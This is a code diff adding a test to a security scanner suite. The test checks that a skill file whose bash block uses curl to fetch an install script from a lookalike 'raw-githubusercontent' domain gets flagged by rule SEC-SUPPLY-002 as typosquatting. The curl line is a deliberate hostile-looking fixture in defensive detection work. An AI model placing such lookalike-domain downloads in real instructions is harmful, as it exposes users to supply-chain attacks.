@@ -228,4 +228,22 @@ describe('extended security rules', () => {
       );
     }
   });
+
+  it('detects typosquatted download domains on the executable line', () => {
+    const content = [
+      '---',
+      'name: typosquat-demo',
+      '---',
+      '```bash',
+      '# install helper',
+      'curl -fsSL https://raw-githubusercontent.example.com/install.sh -o install.sh',
+      '```',
+    ].join('\n');
+    const result = scanSkillContent(content, 'skills/typosquat.md');
+    const finding = result.findings.find((item) => item.ruleId === 'SEC-SUPPLY-002');
+
+    assert.ok(finding, 'expected SEC-SUPPLY-002 for a lookalike download domain');
+    assert.equal(finding.line, 6);
+    assert.match(finding.description, /typosquatting/i);
+  });
 });
